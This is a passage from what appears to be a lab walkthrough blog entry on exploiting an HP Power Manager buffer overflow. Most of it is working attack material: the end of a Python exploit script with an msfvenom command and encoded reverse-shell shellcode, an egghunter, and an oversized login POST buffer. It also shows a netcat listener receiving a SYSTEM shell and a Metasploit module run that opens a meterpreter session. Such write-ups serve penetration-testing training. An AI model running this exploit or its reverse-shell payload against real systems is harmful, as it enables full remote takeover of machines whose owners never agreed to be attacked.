7608BCCF JMP ESP MSVCP60.dll</span><br><span class="line"></span><br><span class="line"># [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes:</span><br><span class="line"># [*] msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot; LHOST=192.168.118.3 LPORT=443</span><br><span class="line"># badchar = &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a&quot;</span><br><span class="line">SHELL = (</span><br><span class="line">&quot;n00bn00b&quot;</span><br><span class="line">&quot;\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49&quot;</span><br><span class="line">&quot;\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a&quot;</span><br><span class="line">&quot;\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32&quot;</span><br><span class="line">&quot;\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49&quot;</span><br><span class="line">&quot;\x59\x6c\x58\x68\x4f\x72\x55\x50\x77\x70\x75\x50\x31\x70\x4f&quot;</span><br><span class="line">&quot;\x79\x59\x75\x46\x51\x6f\x30\x33\x54\x4c\x4b\x50\x50\x46\x50&quot;</span><br><span class="line">&quot;\x6e\x6b\x56\x32\x64\x4c\x4e\x6b\x43\x62\x66\x74\x4c\x4b\x44&quot;</span><br><span class="line">&quot;\x32\x74\x68\x56\x6f\x48\x37\x43\x7a\x77\x56\x65\x61\x6b\x4f&quot;</span><br><span class="line">&quot;\x6e\x4c\x57\x4c\x73\x51\x53\x4c\x36\x62\x36\x4c\x65\x70\x5a&quot;</span><br><span class="line">&quot;\x61\x7a\x6f\x34\x4d\x33\x31\x6a\x67\x39\x72\x38\x72\x30\x52&quot;</span><br><span class="line">&quot;\x76\x37\x6c\x4b\x71\x42\x62\x30\x6e\x6b\x51\x5a\x35\x6c\x4e&quot;</span><br><span class="line">&quot;\x6b\x42\x6c\x62\x31\x43\x48\x7a\x43\x47\x38\x46\x61\x5a\x71&quot;</span><br><span class="line">&quot;\x36\x31\x4c\x4b\x30\x59\x65\x70\x37\x71\x58\x53\x6e\x6b\x72&quot;</span><br><span class="line">&quot;\x69\x62\x38\x58\x63\x36\x5a\x52\x69\x4e\x6b\x57\x44\x4e\x6b&quot;</span><br><span class="line">&quot;\x66\x61\x79\x46\x74\x71\x69\x6f\x4e\x4c\x4a\x61\x48\x4f\x74&quot;</span><br><span class="line">&quot;\x4d\x46\x61\x68\x47\x30\x38\x4b\x50\x44\x35\x58\x76\x43\x33&quot;</span><br><span class="line">&quot;\x71\x6d\x49\x68\x75\x6b\x31\x6d\x34\x64\x51\x65\x4a\x44\x30&quot;</span><br><span class="line">&quot;\x58\x6c\x4b\x31\x48\x34\x64\x63\x31\x38\x53\x42\x46\x6c\x4b&quot;</span><br><span class="line">&quot;\x44\x4c\x62\x6b\x6c\x4b\x52\x78\x67\x6c\x77\x71\x6b\x63\x6e&quot;</span><br><span class="line">&quot;\x6b\x53\x34\x4e\x6b\x43\x31\x78\x50\x6e\x69\x63\x74\x31\x34&quot;</span><br><span class="line">&quot;\x57\x54\x61\x4b\x31\x4b\x35\x31\x71\x49\x53\x6a\x43\x61\x6b&quot;</span><br><span class="line">&quot;\x4f\x4b\x50\x71\x4f\x53\x6f\x62\x7a\x6e\x6b\x67\x62\x58\x6b&quot;</span><br><span class="line">&quot;\x6e\x6d\x73\x6d\x63\x58\x65\x63\x55\x62\x75\x50\x47\x70\x63&quot;</span><br><span class="line">&quot;\x58\x31\x67\x74\x33\x70\x32\x51\x4f\x72\x74\x52\x48\x30\x4c&quot;</span><br><span class="line">&quot;\x33\x47\x55\x76\x56\x67\x69\x6f\x68\x55\x4f\x48\x6c\x50\x37&quot;</span><br><span class="line">&quot;\x71\x57\x70\x73\x30\x64\x69\x68\x44\x51\x44\x36\x30\x61\x78&quot;</span><br><span class="line">&quot;\x65\x79\x6b\x30\x42\x4b\x55\x50\x69\x6f\x59\x45\x52\x70\x52&quot;</span><br><span class="line">&quot;\x70\x32\x70\x50\x50\x73\x70\x72\x70\x67\x30\x46\x30\x31\x78&quot;</span><br><span class="line">&quot;\x59\x7a\x76\x6f\x4b\x6f\x59\x70\x39\x6f\x49\x45\x7a\x37\x31&quot;</span><br><span class="line">&quot;\x7a\x55\x55\x75\x38\x4b\x70\x4d\x78\x73\x46\x63\x33\x45\x38&quot;</span><br><span class="line">&quot;\x44\x42\x35\x50\x75\x51\x6f\x4b\x6b\x39\x4a\x46\x53\x5a\x54&quot;</span><br><span class="line">&quot;\x50\x30\x56\x76\x37\x31\x78\x6e\x79\x6c\x65\x54\x34\x53\x51&quot;</span><br><span class="line">&quot;\x49\x6f\x58\x55\x4c\x45\x59\x50\x54\x34\x64\x4c\x6b\x4f\x70&quot;</span><br><span class="line">&quot;\x4e\x36\x68\x34\x35\x38\x6c\x73\x58\x4c\x30\x6f\x45\x4c\x62&quot;</span><br><span class="line">&quot;\x76\x36\x4b\x4f\x38\x55\x73\x58\x31\x73\x50\x6d\x30\x64\x63&quot;</span><br><span class="line">&quot;\x30\x6f\x79\x39\x73\x53\x67\x76\x37\x76\x37\x35\x61\x6c\x36&quot;</span><br><span class="line">&quot;\x43\x5a\x74\x52\x51\x49\x52\x76\x78\x62\x79\x6d\x71\x76\x39&quot;</span><br><span class="line">&quot;\x57\x70\x44\x71\x34\x75\x6c\x67\x71\x67\x71\x4c\x4d\x31\x54&quot;</span><br><span class="line">&quot;\x34\x64\x46\x70\x6f\x36\x57\x70\x37\x34\x61\x44\x32\x70\x43&quot;</span><br><span class="line">&quot;\x66\x51\x46\x33\x66\x42\x66\x51\x46\x62\x6e\x31\x46\x76\x36&quot;</span><br><span class="line">&quot;\x50\x53\x76\x36\x42\x48\x54\x39\x7a\x6c\x65\x6f\x6c\x46\x49&quot;</span><br><span class="line">&quot;\x6f\x78\x55\x4d\x59\x6b\x50\x50\x4e\x30\x56\x61\x56\x79\x6f&quot;</span><br><span class="line">&quot;\x46\x50\x65\x38\x73\x38\x4b\x37\x37\x6d\x63\x50\x39\x6f\x69&quot;</span><br><span class="line">&quot;\x45\x6d\x6b\x38\x70\x6e\x55\x4c\x62\x33\x66\x72\x48\x69\x36&quot;</span><br><span class="line">&quot;\x4c\x55\x4f\x4d\x4d\x4d\x69\x6f\x68\x55\x65\x6c\x55\x56\x73&quot;</span><br><span class="line">&quot;\x4c\x76\x6a\x4d\x50\x49\x6b\x49\x70\x33\x45\x53\x35\x4f\x4b&quot;</span><br><span class="line">&quot;\x67\x37\x75\x43\x64\x32\x42\x4f\x71\x7a\x37\x70\x50\x53\x59&quot;</span><br><span class="line">&quot;\x6f\x4b\x65\x41\x41&quot;)</span><br><span class="line"></span><br><span class="line">EH =&#x27;\x33\xD2\x90\x90\x90\x42\x52\x6a&#x27;</span><br><span class="line">EH +=&#x27;\x02\x58\xcd\x2e\x3c\x05\x5a\x74&#x27;</span><br><span class="line">EH +=&#x27;\xf4\xb8\x6e\x30\x30\x62\x8b\xfa&#x27;</span><br><span class="line">EH +=&#x27;\xaf\x75\xea\xaf\x75\xe7\xff\xe7&#x27;</span><br><span class="line"></span><br><span class="line">evil =  &quot;POST http://%s/goform/formLogin HTTP/1.1\r\n&quot;</span><br><span class="line">evil += &quot;Host: %s\r\n&quot;</span><br><span class="line">evil += &quot;User-Agent: %s\r\n&quot;</span><br><span class="line">evil += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br><span class="line">evil += &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;</span><br><span class="line">evil += &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;</span><br><span class="line">evil += &quot;Keep-Alive: 300\r\n&quot;</span><br><span class="line">evil += &quot;Proxy-Connection: keep-alive\r\n&quot;</span><br><span class="line">evil += &quot;Referer: http://%s/index.asp\r\n&quot;</span><br><span class="line">evil += &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br><span class="line">evil += &quot;Content-Length: 678\r\n\r\n&quot;</span><br><span class="line">evil += &quot;HtmlOnly=true&amp;Password=admin&amp;loginButton=Submit+Login&amp;Login=admin&quot;</span><br><span class="line">evil += &quot;\x41&quot;*256 + RET + &quot;\x90&quot;*32 + EH + &quot;\x42&quot;*287 + &quot;\x0d\x0a&quot;</span><br><span class="line">evil = evil % (HOST,HOST,SHELL,HOST)</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">print &#x27;[+] Sending evil buffer...&#x27;</span><br><span class="line">s.send(evil)</span><br><span class="line">print s.recv(1024)</span><br><span class="line">print &quot;[+] Done!&quot;</span><br><span class="line">print &quot;[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell&quot; % HOST</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s set up a netcat listener on port 443 and launch the Python exploit against the target.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# python exploit.py 192.168.120.91</span><br><span class="line">HP Power Manager Administration Universal Buffer Overflow Exploit</span><br><span class="line">ryujin __A-T__ offensive-security.com</span><br><span class="line">[+] Sending evil buffer...</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line">[*] Check your shell at 192.168.120.91:4444 , can take up to 1 min to spawn your shell</span><br><span class="line">root@kali:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>After a few seconds we should receive our reverse shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.120.91: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.118.3] from (UNKNOWN) [192.168.120.91] 49170</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Shell-2-Metasploit-Module-hp-power-manager-filename"><a href="#Shell-2-Metasploit-Module-hp-power-manager-filename" class="headerlink" title="Shell #2: Metasploit Module hp_power_manager_filename"></a><strong>Shell #2: Metasploit Module hp_power_manager_filename</strong></h3><p>We could also leverage a public Metasploit module against this vulnerability.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/http/hp_power_manager_filename</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set RHOST 192.168.120.91</span><br><span class="line">RHOST =&gt; 192.168.120.91</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set LHOST 192.168.118.3</span><br><span class="line">LHOST =&gt; 192.168.118.3</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/http/hp_power_manager_filename):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS   192.168.120.91   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.118.3    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     443              yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows XP SP3 / Win Server 2003 SP0</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:443</span><br><span class="line">[*] Generating payload...</span><br><span class="line">[*] Trying target Windows XP SP3 / Win Server 2003 SP0...</span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.120.91</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.118.3:443 -&gt; 192.168.120.91:49167) at 2020-03-26 13:39:25 -0400</span><br><span class="line">[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3620 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>In some cases this module produces the following error:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:443</span><br><span class="line">[*] Generating payload...</span><br><span class="line">[*] Trying target Windows XP SP3 / Win Server 2003 SP0...</span><br><span class="line">[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(windows/http/hp_power_manager_filename) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>However, this is easily resolved by re-running the module.</p>
]]></content>
      <categories>
        <category>Windows Walkthrough</category>
      </categories>
      <tags>
        <tag>Exploit</tag>
        <tag>BOF</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
</search>
